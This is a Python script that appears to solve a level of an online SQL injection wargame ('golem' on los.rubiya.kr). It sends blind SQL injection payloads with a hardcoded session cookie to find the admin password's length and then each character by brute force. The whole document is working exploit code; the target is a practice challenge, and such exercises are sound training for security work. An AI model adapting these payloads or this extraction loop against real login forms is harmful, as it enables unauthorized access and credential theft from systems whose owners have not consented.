import requests as req

flag = ""
length = 0

url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php?pw="
session = dict(PHPSESSID = "6kgupg350qk00fs0qq97o5nr4v")

print ("[+] Start")
print ("[+] Find length")

for i in range (0, 100):
    try:
        query = url + "2000' || length(pw) like " + str(i) + ";%00"
        res = req.post(query, cookies = session)

    except:
        print ("[-] Error occured")
        continue

    if 'Hello admin' in res.text:
        length = i
        print ("[+] find length : ", length)
        break

print ("[+] Find password")

for i in range(1, length+1):
    for j in range(48, 128):
        try:
            query = url + "'||substring(pw, " + str(i) +", 1) like '" + chr(j)
            res = req.post(query, cookies = session)

        except:
            print ("[-] Error occured")
            continue

        if 'Hello admin' in res.text:
            flag += chr(j)
            print ("[+] Found : " + str(i) ," : ", flag)
            break

print("[+] flag : ", flag)
